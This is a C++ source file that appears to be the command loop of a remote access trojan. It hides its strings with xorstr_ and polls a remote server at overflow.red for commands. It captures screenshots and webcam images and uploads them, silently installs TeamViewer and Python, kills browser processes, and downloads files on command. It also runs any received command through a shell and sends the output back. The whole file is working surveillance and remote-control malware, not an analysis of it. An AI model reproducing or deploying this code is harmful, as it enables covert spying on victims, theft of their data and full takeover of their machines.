#include "communication.h"
#include <iostream>
#include <filesystem>

#include "..\utility\requests.h"
#include "functions.h"
#include "../utility/helper.h"
#include "client.h"

namespace fs = std::filesystem;

namespace client {
	namespace communication {
		void handler_loop() {
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&webhook_url=") + client::client_webhook_url + std::string(xorstr_("&content=**Notification**\n```\n")) + std::string(xorstr_("Communication Thread Created")) + xorstr_("\n```"));

			if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\") + "tv"))
				functions::install_teamviewer();

			if (!std::filesystem::exists(xorstr_("C:\\Python38")) && !std::filesystem::exists(xorstr_("C:\\Python39")) && !std::filesystem::exists(xorstr_("C:\\Program Files\\Python39")))
				functions::install_python();
		
			while (true) {
				auto cmd = requests::get_request("https://overflow.red/post.php", xorstr_("cmd=get_command&ip=") + client::ip);
				if (!cmd.empty()) {	
					if (cmd == xorstr_("screenshot")) {
						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**") + std::string("&ip=") + client::ip);
					} 
					else if (cmd == xorstr_("windows")) {
						requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload(xorstr_("All Windows"), client::functions::get_all_windows()));
					}
					else if (cmd == xorstr_("camera")) {
						if (std::filesystem::exists(xorstr_("C:\\Python38")) || std::filesystem::exists(xorstr_("C:\\Python39")) || std::filesystem::exists(xorstr_("C:\\Program Files\\Python39"))) {
							system((std::string("python -c \"(lambda __g: [[(camera.set(cv2.CAP_PROP_FPS, 30.0), (camera.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter.fourcc(\'m\', \'j\', \'p\', \'g\')), (camera.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter.fourcc(\'M\', \'J\', \'P\', \'G\')), (camera.set(cv2.CAP_PROP_FRAME_WIDTH, 1920), (camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080), [(cv2.imwrite(\'") + helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + std::string(".jpg") + std::string("\', img), None)[1] for (__g[\'retval\'], __g[\'img\']) in [(camera.read())]][0])[1])[1])[1])[1])[1] for __g[\'camera\'] in [(cv2.VideoCapture(0, cv2.CAP_DSHOW))]][0] for __g[\'cv2\'] in [(__import__(\'cv2\', __g, __g))]][0])(globals())\"")).c_str());
							requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**Camera**") + std::string("&ip=") + client::ip);
						}
						else {
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Camera**\n```\nPython is not installed.\n```"));
						}
					}
					else if (cmd == xorstr_("tv setup")) {
						if (std::filesystem::exists(std::string(xorstr_("cd ")) + std::string(helpers::roaming + xorstr_("\\Microsoft\\tv")))) {
							system((std::string(xorstr_("cd ")) + std::string(helpers::roaming + xorstr_("\\Microsoft\\tv")) + std::string(xorstr_("&& powershell.exe -file ")) + xorstr_("teamviewer_install.ps1")).c_str());

							system(xorstr_("taskkill /F /IM MicrosoftEdge.exe"));
							system(xorstr_("taskkill /F /IM firefox.exe "));
							system(xorstr_("taskkill /F /IM chrome.exe "));

							client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
							requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**TeamViewer**") + std::string(xorstr_("&ip=")) + client::ip);
						} 
						else {
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("TeamViewer is not installed. Possible failure to install during startup")) + xorstr_("\n```"));
						}
					}
					else if (cmd.find(xorstr_("download")) != std::string::npos &&
							 (cmd.find(xorstr_("https")) != std::string::npos ||
							 cmd.find(xorstr_("http")) != std::string::npos)) {

						auto index = cmd.find(xorstr_("http")) != std::string::npos ? cmd.find(xorstr_("http")) : cmd.find(xorstr_("https"));
						auto url = cmd.substr(index);
						requests::download_file(url, helpers::roaming + xorstr_("\\Microsoft\\download") + cmd.substr(cmd.find_last_of(".")));
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Download**\n```\nFinished Downloading\n```"));
					}
					else if (cmd.find(xorstr_("wallpaper")) != std::string::npos &&
							(cmd.find(xorstr_("https")) != std::string::npos ||
							cmd.find(xorstr_("http")) != std::string::npos)) {

						auto index = cmd.find(xorstr_("http")) != std::string::npos ? cmd.find(xorstr_("http")) : cmd.find(xorstr_("https"));
						auto url = cmd.substr(index);
						auto path = helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("download") + cmd.substr(cmd.find_last_of("."));
						std::string message = "";
						if (requests::download_file(url, path)) {
							functions::set_wallpaper(helpers::s2ws(path).c_str());
							message = xorstr_("Success");
						}
						else {
							message = xorstr_("Failed to download file");
						}

						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Set Wallpaper**\n```\n") + message + xorstr_("\n```"));
					}
					else {
						auto response = helpers::exec(cmd.c_str());
						if (response.empty())
							response = xorstr_("-Empty-");
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Command Response**\n```\n") + response + xorstr_("\n```"));
					}
				}
			}
		}
	}
}